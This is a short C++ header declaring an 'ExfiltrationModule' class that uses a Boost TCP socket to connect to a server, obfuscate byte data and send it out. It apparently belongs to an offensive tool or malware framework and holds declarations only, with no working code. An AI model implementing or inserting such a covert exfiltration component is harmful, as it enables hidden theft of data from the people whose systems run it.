#pragma once
#include "NetworkModule.h"

class ExfiltrationModule : public NetworkModule {
public:
  ExfiltrationModule(const std::string &server_address, int server_port);
  ~ExfiltrationModule();
  std::string get_module_name() const override;
  bool connect_to_server(const std::string &server_address, int server_port);
  void send_data_to_server(const std::vector<std::byte> &data);
  void obfuscate_data(const std::vector<std::byte> &data);
  void start_module(const std::vector<std::byte> &data);

private:
  boost::asio::ip::tcp::socket m_socket;
};